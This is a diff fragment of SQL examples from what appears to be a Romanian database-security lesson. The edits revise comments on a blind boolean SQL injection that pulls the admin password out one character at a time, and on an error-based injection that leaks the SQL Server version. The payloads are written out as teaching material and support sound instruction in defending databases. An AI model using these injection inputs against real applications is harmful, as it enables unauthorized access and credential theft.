@@ -28,8 +28,8 @@ FROM Utilizatori --%'
 ' OR (SELECT SUBSTRING(Parola, 1, 1) FROM Utilizatori
       WHERE Username = 'admin') = 'a' --
 
--- Dacă pagina se încarcă normal → prima literă este 'a'
--- Dacă pagina afișează eroare → prima literă NU este 'a'
+-- Dacă pagina afișează rezultate → prima literă este 'a'
+-- Dacă nu afișează niciun rezultat → prima literă NU este 'a'
 -- Atacatorul repetă pentru fiecare literă, fiecare poziție
 
 -- ==== 10-securitatea-bazelor-de-date.md:906–913 ====
@@ -47,7 +47,7 @@ FROM Utilizatori --%'
 ' AND 1=CONVERT(int, @@version) --
 
 -- Eroare: Conversion failed when converting the nvarchar value
--- 'Microsoft SQL Server 2025 (RTM) - 17.0.900.x ...' to data type int.
+-- 'Microsoft SQL Server 2025 (RTM) - 17.0.1000.7 ...' to data type int.
 
 -- ==== 10-securitatea-bazelor-de-date.md:937–938 ====
 UPDATE Utilizatori SET Parola = 'parolaNoua'
